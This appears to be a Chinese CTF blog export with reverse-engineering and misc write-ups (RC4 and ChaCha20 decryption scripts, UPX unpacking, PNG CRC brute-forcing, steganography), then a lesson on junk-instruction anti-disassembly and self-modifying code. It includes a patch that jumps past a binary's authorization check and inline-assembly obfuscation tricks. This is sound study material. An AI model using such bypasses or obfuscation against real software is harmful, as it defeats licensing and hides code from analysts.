<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#tab_s</span></span><br><span class="line">s = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)]</span><br><span class="line">k = (<span class="string">b&quot;InfinityLoop&quot;</span>*<span class="number">22</span>) [<span class="number">0</span>:<span class="number">256</span>]</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> hit_count <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">99999</span>):</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (s[i]+j+k[i])%<span class="number">256</span></span><br><span class="line">        s[i],s[j] = s[j],s[i]</span><br><span class="line"> </span><br><span class="line">answer = [<span class="number">0xA6</span>,<span class="number">0x3D</span>,<span class="number">0x54</span>,<span class="number">0x0B0</span>,<span class="number">0x74</span>,<span class="number">0xCC</span>,<span class="number">0xBD</span>,<span class="number">0x2A</span>,<span class="number">0x4A</span>,<span class="number">0x0DE</span>,<span class="number">0x0BD</span>,<span class="number">0x35</span>,<span class="number">0x0D1</span>,<span class="number">0x1D</span>,<span class="number">0x80</span>,<span class="number">0x32</span>,<span class="number">0x5F</span>,<span class="number">0x64</span>,<span class="number">0x2F</span>,<span class="number">0x0C5</span>,<span class="number">0x0DD</span>,<span class="number">0x11</span>,<span class="number">0x3E</span>,<span class="number">0x95</span>,<span class="number">0x0CC</span>,<span class="number">0x17</span>,<span class="number">0x13</span>,<span class="number">0x0E5</span>,<span class="number">0x5E</span>,<span class="number">0x65</span>,<span class="number">0x0CE</span>,<span class="number">0x42</span>,<span class="number">0x9E</span>,<span class="number">0x47</span>,<span class="number">0x0C8</span>,<span class="number">0x0F3</span>,<span class="number">0x4D</span>,<span class="number">0x8A</span>,<span class="number">0x0A6</span>,<span class="number">0x1F</span>,<span class="number">0x0F0</span>,<span class="number">0x50</span>,<span class="number">0x27</span>,<span class="number">0x0A2</span>,<span class="number">0x28</span>,<span class="number">0x81</span>,<span class="number">0x24</span>,<span class="number">0x0A7</span>,<span class="number">0x0B4</span>,<span class="number">0x90</span>,<span class="number">0x0FC</span>,<span class="number">0x93</span>,<span class="number">0x8A</span>,<span class="number">0x0C1</span>,<span class="number">0x77</span>,<span class="number">0x0D5</span>,<span class="number">0x16</span>,<span class="number">0x1E</span>,<span class="number">0x0FD</span>,<span class="number">0x87</span>,<span class="number">0x0C7</span>,<span class="number">0x0BB</span>,<span class="number">0x0B3</span>,<span class="number">0x0</span>]</span><br><span class="line"> </span><br><span class="line">v10,v11 = <span class="number">0</span>,<span class="number">0</span></span><br><span class="line">v14 = s </span><br><span class="line">tab = [<span class="number">0</span>]*<span class="number">63</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">63</span>):</span><br><span class="line">    v11 = v11+<span class="number">1</span></span><br><span class="line">    v10 = (v14[v11] + v10)&amp; <span class="number">0xff</span></span><br><span class="line">    v14[v11],v14[v10] = v14[v10],v14[v11]</span><br><span class="line">    tab[j] = v14[(v14[v10]+ v14[v11]) %<span class="number">256</span>]</span><br><span class="line"> </span><br><span class="line">flag = [answer[i]^tab[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">63</span>)]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br><span class="line"><span class="comment">#flag&#123;i_hope_you_didnt_click_the_button_99999__justRE_in_Static&#125;</span></span><br></pre></td></tr></table></figure>

<p>flag:flag{i_hope_you_didnt_click_the_button_99999__justRE_in_Static}</p>
<h2 id="二进制玩家人均全栈"><a href="#二进制玩家人均全栈" class="headerlink" title="二进制玩家人均全栈"></a>二进制玩家人均全栈</h2><p>得到一个没有后缀名的文件，先用010editor打开</p>
<p><img src="/../images/ctfshow/qz.png"></p>
<p>看文件头发现为压缩包，把后缀改为zip格式</p>
<p><img src="/../images/ctfshow/qz2.png"></p>
<p>发现还要密码，但是全局加密是&#x3D;&#x3D;00 00&#x3D;&#x3D;可以基本判断是伪加密，改一下后面&#x3D;&#x3D;全局方式位标记&#x3D;&#x3D;即可，解压得到文件</p>
<p><img src="/../images/ctfshow/qz3.png"></p>
<p>先查壳，发现看不出个所以然，用010editor打开</p>
<p><img src="/../images/ctfshow/qz4.png"></p>
<p>可以发现头文件疑似被魔改了，将MZ修改为elf试试</p>
<p><img src="/../images/ctfshow/qz5.png"></p>
<p>再用查壳工具查壳</p>
<p><img src="/../images/ctfshow/qz6.png"></p>
<p>发现是upx的壳，但是也有可能是魔改upx我们先用010editor看看，这里也可以直接手动脱壳，我们在010editor中将vmp改为upx!（还有其他vmp也要改成upx）</p>
<p><img src="/../images/ctfshow/qz7.png"></p>
<p>再直接放入工具脱壳即可</p>
<p><img src="/../images/ctfshow/qz8.png"></p>
<p>用ida64打开分析，定位至关键函数</p>
<p><img src="/../images/ctfshow/qz9.png"></p>
<p>可以看见这其实是一道迷宫题提取出迷宫矩阵</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"><span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"><span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"><span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"><span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span></span><br><span class="line"><span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span></span><br><span class="line"><span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span></span><br><span class="line"><span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>1代表可以通行0代表不能通信，所以路径为：</p>
<p>dsddssaassddsddwwddsss</p>
<p>所以flag为：ctfshow{dsddssaassddsddwwddsss}</p>
<h2 id="encode"><a href="#encode" class="headerlink" title="encode"></a>encode</h2><p>得到文件先用010editor打开，头文件显示为elf文件</p>
<p><img src="/../images/ctfshow/ed1.png"></p>
<p>用查壳工具查壳</p>
<p><img src="/../images/ctfshow/ed2.png"></p>
<p>发现是upx的壳，先在010editor里看看有没有魔改的地方，发现没有直接工具脱壳</p>
<p><img src="/../images/ctfshow/ed3.png"></p>
<p>脱完壳后用ida打开分析,对一些函数进行初步分析改名得到</p>
<p><img src="/../images/ctfshow/ed4.png"></p>
<p>先分析&#x3D;&#x3D;sub_8048AC2&#x3D;&#x3D;函数</p>
<p><img src="/../images/ctfshow/ed5.png"></p>
<p>发现是一个base64加密</p>
<p><img src="/../images/ctfshow/ed6.png"></p>
<p>这一部分是将加密的结果再与v5进行异或，接着进入 sub_8048E24函数， sub_8048E24函数是一个RC4加密这里可以直接解出rc4的值也可以动调找出rc4</p>
<p>的值</p>
<p>这里写一个解密脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key0 = <span class="string">b&#x27;Flag&#123;This_a_Flag&#125;&#x27;</span>   <span class="comment">#密钥</span></span><br><span class="line">c = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;E8D8BD91871A010E560F53F4889682F961420AF2AB08FED7ACFD5E00&#x27;</span>)   <span class="comment">#加密后的字符串</span></span><br><span class="line">v9 = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)]</span><br><span class="line">v8 = (key0 * <span class="number">50</span>)[:<span class="number">256</span>]</span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    j = (v9[i] + j + v8[i]) % <span class="number">256</span></span><br><span class="line">    v9[i], v9[j] = v9[j], v9[i]</span><br><span class="line">tab = [<span class="number">0</span>] * <span class="number">28</span></span><br><span class="line">i, j = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">28</span>):</span><br><span class="line">    i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">    j = (v9[i] + j) % <span class="number">256</span></span><br><span class="line">    v9[i], v9[j] = v9[j], v9[i]</span><br><span class="line">    tab[t] = v9[(v9[i] + v9[j]) % <span class="number">256</span>]</span><br><span class="line"> </span><br><span class="line">c = [tab[i] ^ v <span class="keyword">for</span> i, v <span class="keyword">in</span> <span class="built_in">enumerate</span>(c)]</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="comment"># [35, 21, 37, 83, 8, 26, 89, 56, 18, 106, 57, 49, 39, 91, 11, 19, 19, 8, 92, 51, 11, 53, 97, 1, 81, 31, 16, 92]</span></span><br></pre></td></tr></table></figure>

<p>之后再与v5进行异或</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">v5 = <span class="string">&quot;Flag&#123;This_a_Flag&#125;&quot;</span></span><br><span class="line">str_values = [<span class="number">35</span>, <span class="number">21</span>, <span class="number">37</span>, <span class="number">83</span>, <span class="number">8</span>, <span class="number">26</span>, <span class="number">89</span>, <span class="number">56</span>, <span class="number">18</span>, <span class="number">106</span>, <span class="number">57</span>, <span class="number">49</span>, <span class="number">39</span>, <span class="number">91</span>, <span class="number">11</span>, <span class="number">19</span>, <span class="number">19</span>, <span class="number">8</span>, <span class="number">92</span>, <span class="number">51</span>, <span class="number">11</span>, <span class="number">53</span>, <span class="number">97</span>, <span class="number">1</span>, <span class="number">81</span>, <span class="number">31</span>, <span class="number">16</span>, <span class="number">92</span>]</span><br><span class="line">result = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str_values)):</span><br><span class="line">    result.append(<span class="built_in">chr</span>(str_values[i] ^ <span class="built_in">ord</span>(v5[i % <span class="built_in">len</span>(v5)])))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(result))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>得到base64解密后的结果，但是这里还要注意base64是换了码表的</p>
<p><img src="/../images/ctfshow/ed7.png"></p>
<p>得到flag:BJD{0v0_Y0u_g07_1T!}</p>
<h2 id="Easy"><a href="#Easy" class="headerlink" title="Easy"></a>Easy</h2><p>这一题给了一个exe可执行文件，先用查壳工具查壳</p>
<p><img src="/../images/ctfshow/ea1.png"></p>
<p>发现没有壳，尝试运行一下</p>
<p><img src="/../images/ctfshow/ea2.png"></p>
<p>发现没有任何提示，用ida打开查看main函数也看不出任何端倪</p>
<p><img src="/../images/ctfshow/ea3.png"></p>
<p>而且也不会跳转到其他函数去，所以可以看看其他函数，之后发现&#x3D;&#x3D;__ques&#x3D;&#x3D;似乎是在画一个图形</p>
<p><img src="/../images/ctfshow/ea4.png"></p>
<p>可以试试用od修改程序逻辑让程序直接跳转至该函数执行，只要找到&#x3D;&#x3D;__ques&#x3D;&#x3D;的地址即可，这里就不细说了，打印出的图像为：</p>
<p><img src="/../images/ctfshow/ea5.png"></p>
<p>HACKIT4FUN</p>
<p>flag:BJD{HACKIT4FUN}</p>
<h2 id="BJD-hamburger-competition"><a href="#BJD-hamburger-competition" class="headerlink" title="BJD hamburger competition"></a>BJD hamburger competition</h2><p>这一天是一个untiy3D小游戏，看了网上的wp可以用&#x3D;&#x3D;dnSpy&#x3D;&#x3D;进行反编译，将游戏文件的BJD_hamburger_competition\BJD hamburger competition_Data\Managed\Assembly-CSharp.dll,拖入dnspy进行反编译</p>
<p><img src="/../images/ctfshow/lb1.png"></p>
<p>在末尾发现一串神秘的字符&#x3D;&#x3D;DD01903921EA24941C26A48F2CEC24E0BB0E8CC7&#x3D;&#x3D;，查看Sha1函数，而后面又进行了MD5加密，我们先进行MD5解密</p>
<p><img src="/../images/ctfshow/lb2.png"></p>
<p>再分析Sha1函数</p>
<p><img src="/../images/ctfshow/lb3.png"></p>
<p>这里ToString（“X2”）的意思是输出大写，所以可以判断1001进行加密是大写进制，这里试试16位大写和32位大写，而且之去前二十位，因此可以确定是MD5大写加密取前20位</p>
<p><img src="/../images/ctfshow/lb4.png"></p>
<p>flag为：BJDCTF{B8C37E33DEFDE51CF91E}（后续交flag发现要用flag{}来包）</p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>帕鲁CTFwp</title>
    <url>/wp/</url>
    <content><![CDATA[<h1 id="0x01MISC"><a href="#0x01MISC" class="headerlink" title="0x01MISC"></a>0x01MISC</h1><p>上周第一次参加了正式的ctf比赛，学到了很多东西，特意记录一下自己的wp与复现</p>
<span id="more"></span>

<h2 id="江"><a href="#江" class="headerlink" title="江"></a>江</h2><p>这一题我们直接将其放至谷歌地图搜索</p>
<p><img src="/../images/wp.assets/j1.png"></p>
<p>可以看到显示为武汉江汉路，再看左边的新金珠宝，就可以定位到武汉市新金珠宝江汉路店，再地图上搜索就可有找到具体位置了</p>
<p><img src="/../images/wp.assets/j2.png"></p>
<p>这样就可以得到flag：flag{湖北省武汉市江汉二路与江汉路步行街交叉路口}</p>
<h2 id="FM145-8"><a href="#FM145-8" class="headerlink" title="FM145.8"></a>FM145.8</h2><p>这一题首先去查看频谱仪跟查看是否为音频隐写，都不是这里就想到了另一种方法用声音传输图片，这里我们使用RX sstv来解决这题，在使用是应将声音的输入与输出都转为虚拟声卡也可以用手机的Robot36</p>
<p><img src="/../images/wp.assets/sstv.png"></p>
<p>所以可以得到答案:flag{19b4dD77bF3c66f9ic23F5A25Bc314CB}</p>
<p>另一种解法是使用QSSTV在kali中输入<code>sudo apt-get install qsstv</code></p>
<p>安装qstv，之后qsstv-&gt;Options-&gt;Configration-&gt;Sound-&gt;from file</p>
<p><img src="/../images/wp.assets/kali.png"></p>
<p>但是Qsstv对音频有格式要求必须是wav格式且采样率必须为48000</p>
<p>而本题的采样率为41400，这里可以使用Audacity去导出48000hz采样率的音频</p>
<p>再使用Qsstv即会产生图像</p>
<p><img src="/../images/wp.assets/323.png"></p>
<h2 id="Misc-签到"><a href="#Misc-签到" class="headerlink" title="Misc-签到"></a>Misc-签到</h2><p>这一题打开是一个文档然后是一堆数字，这里就是将十进制数字的字符串转换成相应的 Unicode 字符串</p>
<p><img src="/../images/wp.assets/g.png"></p>
<p>这里写一个python脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">string = <span class="string">&quot;27880 30693 25915 21892 38450 23454 39564 23460 21457 36865 112 108 98 99 116 102 33719 21462 21069 27573 102 108 97 103 20851 27880 79 110 101 45 70 111 120 23433 20840 22242 38431 22238 22797 112 108 98 99 116 102 33719 21462 21518 27573 102 108 97 103&quot;</span></span><br><span class="line">decimals = <span class="built_in">map</span>(<span class="built_in">int</span>, decimal_string.split())</span><br><span class="line"></span><br><span class="line">chinese_chars = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(decimal) <span class="keyword">for</span> decimal <span class="keyword">in</span> decimals])</span><br><span class="line"><span class="built_in">print</span>(chinese_chars)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>最后运行就可以得到我们想要的结果</p>
<h2 id="ez-misc"><a href="#ez-misc" class="headerlink" title="ez_misc"></a>ez_misc</h2><p>这一题给了一张图片与一个需要密码的压缩包文件</p>
<p><img src="/../images/wp.assets/ezmisc1.png"></p>
<p>这里我们用010 Editor打开，在文件末尾发现一提示字符</p>
<p><img src="/../images/wp.assets/ezmisc2.png"></p>
<p>我们将后面的空格与点复制出来，但是并不会显现我们可以考虑一下snow隐写，将后面的字符复制粘贴在一个新建文本上</p>
<p><img src="/../images/wp.assets/ezmisc3.png"></p>
<p>可以得到压缩包密码Carefree and carefree</p>
<p><img src="/../images/wp.assets/ezmisc4.png"></p>
<p>最终得到flag：flag{b220116fc6ca827ecf3cb6c6c06dac26}</p>
<h2 id="350x350"><a href="#350x350" class="headerlink" title="350x350"></a>350x350</h2><p>这一题给了我们一张图片加有密码的压缩包</p>
<p><img src="/../images/wp.assets/350.png"></p>
<p>按惯例我们用010Editor去查看，发现后面缺少结束标志，判断有可能在里面塞了压缩包</p>
<p><img src="/../images/wp.assets/3502.png"></p>
<p>我们打开kali利用binwalk工具查看</p>
<p><img src="/../images/wp.assets/3503.png"></p>
<p>可以看见里面藏了多个xml文件，用foremost将其分离可以得到一个压缩包文件我们将其以word的方式打开</p>
<p><img src="/../images/wp.assets/3504.png"></p>
<p>很显然是隐藏了文字我们将隐藏文字的勾去掉就能显现文字了</p>
<p><img src="/../images/wp.assets/3505.png"></p>
<p>把这段文字放到网上搜索显示为64周易，可能为一种加密方式，这里就不用传统的解密方式，解密字典如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">乾:111111 坤:000000 屯:010001 蒙:100010 需:010111 讼:111010 师:000010 比:010000 小畜:110111 履:111011 泰:000111 否:111000</span><br><span class="line">同人:111101 大有:101111 谦:000100 豫:001000 随:011001 蛊:100110 临:000011 观:110000 噬嗑:101001 贲:100101 剥:100000 复:000001</span><br><span class="line">无妄:111001 大畜:100111 颐:100001 大过:011110 坎:010010 离:101101 咸:011100恒:001110遁:111100 大壮:001111</span><br><span class="line">晋:101000 明夷:000101 家人:110101 睽:101011 蹇:010100 解:001010 损:100011 益:110001 夬:011111 姤:111110 萃:011000 升:000110</span><br><span class="line">困:011010 井:010110 革:011101 鼎:101110 震:001001 艮:100100 渐:110100 归妹:001011 丰:001101 旅:101100 巽:110110 兑:011011</span><br><span class="line">涣:110010 节:010011 中孚:110011 小过:001100 既济:010101 未济:101010    阳:1  阴:0</span><br></pre></td></tr></table></figure>

<p>我们这里使用随波逐流工具箱直接解密出密文</p>
<p><img src="/../images/wp.assets/3506.png"></p>
<p>我们将密码填入压缩包又得到了一张图片：</p>
<p><img src="/../images/wp.assets/22.jpg"></p>
<p>老规矩用010editor打开看一看</p>
<p><img src="/../images/wp.assets/3507.png"></p>
<p>依旧没有尾部标志，使用binwalk+foremost可以分离出两张图片</p>
<p><img src="/../images/wp.assets/3508.png"></p>
<h1 id="0x02RE"><a href="#0x02RE" class="headerlink" title="0x02RE"></a>0x02RE</h1><h2 id="Auth-System"><a href="#Auth-System" class="headerlink" title="Auth System"></a>Auth System</h2><p>对于这题我们再进行查壳后首先使用x64debug进行调试可以发现有一行直接跳至‘This computer is not authorized’的指令再动态调试后发现他最后都会执行这一条汇编指令，所以我们可以对其修改，使其跳向输出flag的命令行</p>
<p><img src="/../images/wp.assets/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240422202256.png"></p>
<p>我们对4016F1这行汇编指令进行修改，填充汇编指令使其跳转至4016FA使其能够输出flag</p>
<p><img src="/../images/wp.assets/a2.png"></p>
<p>改完之后我们再调试运行一遍（图片地址由于本人写wp昏头了为错误位置，正确位置为4016FA）</p>
<p><img src="/../images/wp.assets/aa.png"></p>
<p>最终可以在终端得到我们的flag：flag{ASCII_ART_IS_FUN}</p>
<h2 id="帕鲁被病毒感染了"><a href="#帕鲁被病毒感染了" class="headerlink" title="帕鲁被病毒感染了"></a>帕鲁被病毒感染了</h2><p>一进来是一个压缩包加一张png图片，初看这张图片很有可能存在一个高宽隐写，这里我们使用CRC32校验，去爆破出正确的宽高</p>
<p><img src="/../images/wp.assets/image-20240420113216946.png"></p>
<p>使用python爆破脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">crcbp = <span class="built_in">open</span>(<span class="string">&quot;D:\paluctf\帕鲁被病毒感染了\帕鲁被病毒攻击了\帕鲁帕鲁.png&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()    <span class="comment">#打开图片</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2000</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2000</span>):</span><br><span class="line">        data = crcbp[<span class="number">12</span>:<span class="number">16</span>] + \</span><br><span class="line">            struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, i)+struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, j)+crcbp[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">        crc32 = binascii.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="keyword">if</span>(crc32 == <span class="number">0x8857b020</span>):    <span class="comment">#图片当前CRC</span></span><br><span class="line">            <span class="built_in">print</span>(i, j)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;hex:&#x27;</span>, <span class="built_in">hex</span>(i), <span class="built_in">hex</span>(j))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>得到正确的宽高</p>
<p><img src="/../images/wp.assets/image-20240420113546772.png"></p>
<p>在010修改宽高就可以得到完整的图片</p>
<p><img src="/../images/wp.assets/%E5%B8%95%E9%B2%81%E5%B8%95%E9%B2%811.png"></p>
<p>得到压缩包的密码：palubei@2024#01</p>
<p>打开压缩包之后我们可以发现有三个文件夹加3个文本文件</p>
<p><img src="/../images/wp.assets/image-20240420114130054.png"></p>
<p>我们解析manifest.json中的代码发现其实是一个关于docker容器的部署，三个文件夹为layer层</p>
<p>所以我们逐个分析三个分析  </p>
<p>在第二个文件夹的lay.tar中找到一个名为cat文件</p>
<p><img src="/../images/wp.assets/image-20240420114521758.png"></p>
<p>用010打开cat发现其实一个在Linux的可执行elf文件</p>
<p><img src="/../images/wp.assets/image-20240420114633231.png"></p>
<p>再往后翻就翻到了出题人给的flag</p>
<p><img src="/../images/wp.assets/image-20240420114715334.png"></p>
<p>最终得到flag：flag{0n3_n00b_ru1n5_0n3_hundr3d_pr05}</p>
<h2 id="茶"><a href="#茶" class="headerlink" title="茶"></a>茶</h2><p>这一题拿到程序先查壳</p>
<p><img src="/../images/wp.assets/cha.png"></p>
<p>可以看见是一个无壳的x64可执行文件，将其放入ida静态分析</p>
<p><img src="/../images/wp.assets/cha1.png"></p>
<p>初步分析是将用户输入的字符与内部的字符进行加密比对，如果字符是对的则输出成功提示，这里再用x64dbg动态调试一下，搜素全部字符可以看到提示再试一遍的提示我们再其地方下一个断点</p>
<p><img src="/../images/wp.assets/cha2.png"></p>
<p>单步调试运行，看见指针指到”Is_This_TEA?”这一段字符串处，继续单步运行</p>
<p><img src="/../images/wp.assets/cha3.png"></p>
<p>之后就会发现”Is_This_TEA?”在寄存器中逐渐变小，直至只剩下“TEA?”可以猜测这串字符的前部分被拿去对比加密</p>
<p><img src="/../images/wp.assets/cha4.png"></p>
<p>在”Is_This_TEA?”还有两串字符串</p>
<p><img src="/../images/wp.assets/cha5.png"></p>
<p>其中字符串”SGludDogSW1wcm92ZSBvZiBTYWxzYTIw“很像一串base64编码，用在线解密解密一下</p>
<p><img src="/../images/wp.assets/cha6.png"></p>
<p>可以看见提示说是Salsa20的改进算法，因此可以想到chacha20算法，正好也符合题目名字（滑稽）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ChaCha20</span><br><span class="line"></span><br><span class="line">enc_data = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;f568c48912eed6dc520c7164f44b6378e1d0d3e248914fa8847b405a131f&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = <span class="string">b&quot;SGludDogSW1wcm92ZSBvZiBTYWxzYTIw&quot;</span></span><br><span class="line">nonce = <span class="string">b&quot;Is_This_&quot;</span></span><br><span class="line"></span><br><span class="line">cc = ChaCha20.new(key=key, nonce=nonce)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(cc.decrypt(enc_data))</span><br></pre></td></tr></table></figure>

<p><img src="/../images/wp.assets/cha7.png" alt="cha7"></p>
<p>得到flag：flag{But_I_Like_ChaCha20_More}</p>
<p>结语：因为才结束几天，官方wp还没有陆续放出来，等放出来会陆续更新</p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>花指令与SMC</title>
    <url>/lesson%E8%8A%B1%E6%8C%87%E4%BB%A4%E4%B8%8ESMC/</url>
    <content><![CDATA[<h2 id="软件保护措施"><a href="#软件保护措施" class="headerlink" title="软件保护措施"></a>软件保护措施</h2><p>一般许多软件有很多保护措施，如静态保护（花指令，加密，加壳，混淆），动态保护（反调试，反虚拟机）</p>
<span id="more"></span>

<h2 id="花指令"><a href="#花指令" class="headerlink" title="花指令"></a>花指令</h2><h3 id="反汇编原理"><a href="#反汇编原理" class="headerlink" title="反汇编原理"></a>反汇编原理</h3><p>1，线性扫描算法</p>
<p>2，递归行进算法</p>
<table>
<thead>
<tr>
<th align="center">工具</th>
<th align="center">反汇编算法</th>
</tr>
</thead>
<tbody><tr>
<td align="center">OllyDbg</td>
<td align="center">线性扫描算法&#x2F;递归行进算法(按住“Ctrl +A”组合键时)</td>
</tr>
<tr>
<td align="center">SoftICe</td>
<td align="center">线性扫描算法</td>
</tr>
<tr>
<td align="center">WinDBG</td>
<td align="center">线性扫描算法</td>
</tr>
<tr>
<td align="center">W32Dasm</td>
<td align="center">线性扫描算法</td>
</tr>
<tr>
<td align="center">IDA pro</td>
<td align="center">递归行进算法</td>
</tr>
</tbody></table>
<p>​                                                                                                     常见反汇编工具所使用的反汇编算法</p>
<p>而在一些指令中加入一个字符通常会引起错误的反汇编</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__asm &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		push eax</span><br><span class="line">		xor eax, eax</span><br><span class="line">		jmp label1</span><br><span class="line">		__emit <span class="number">0xe9</span></span><br><span class="line">label1:</span><br><span class="line">		pop eax</span><br><span class="line">		mov ebx, <span class="number">1</span></span><br><span class="line">		add eax, ebx</span><br><span class="line">		ret</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>_emit是直接插入一个数的写法，而在汇编指令中，e9常常会被认为是jmp的前缀，而反汇编遇到时会将e9以及后面4个字节一共五个字节当作jmp指令处理</p>
<p>而在这个新插入的字节却不会影响原本的程序运行，因为jmp label1为无条件跳转，所以cpu永远不会执行到__emit 0xe9但却会影响到反汇编，这也起到了保护程序正常运行的目的</p>
<p>在反汇编窗口可以看见反编译器将其错误的解析为jmp指令</p>
<p><img src="/../images/lesson/hua.png"></p>
<p>而对于这种情况，使用递归行进算法的ida可以完美识别</p>
<p><img src="/../images/lesson/HUA1.png"></p>
<p>可以看到ida成功的将e9识别为数据</p>
<p>然而这只是最简单的花指令，要骗过ida，因为ida是根据分支跳转，可以把jmp替换为两条互补的条件跳转指令</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">	__asm &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		push eax</span><br><span class="line">        xor eax,eax</span><br><span class="line">		mov eax,<span class="number">1</span></span><br><span class="line">	    jz label1</span><br><span class="line">		jnz label1</span><br><span class="line">		__emit <span class="number">0xe9</span></span><br><span class="line">label1:</span><br><span class="line">		pop eax</span><br><span class="line">		mov ebx, <span class="number">1</span></span><br><span class="line">		add eax, ebx</span><br><span class="line">		ret</span><br><span class="line"></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>修改完之后我们再放入ida中看看</p>
<p><img src="/../images/lesson/hua4.png"></p>
<p>可以看到这次ida没有处理成功，因为ida是根据控制指令，去到不同的分支，在不同的分支中再采用线性算法，当遇到jz，jnz时，两种情况ida都需要处理，当ida不跳转时，并紧接着来到了E9的位置并将E9当作jmp指令</p>
<h2 id="SMC技术"><a href="#SMC技术" class="headerlink" title="SMC技术"></a>SMC技术</h2><p>SMC全程<strong>Self Modifying Code</strong>技术，代码自修改技术，也就是说，在一段代码执行之前，可以对其进行修改，一般用来加密核心功能逻辑，也是加壳技术的基础</p>
<p><img src="/../images/lesson/smc2.png"></p>
<p>比如有如下两段代码一段为初始化代码而另一段为加密后代码，用ida打开蓝色代码可以正常看到，而红色部分在ida中则是加密后的16进制数据</p>
<p>如如下一段代码</p>
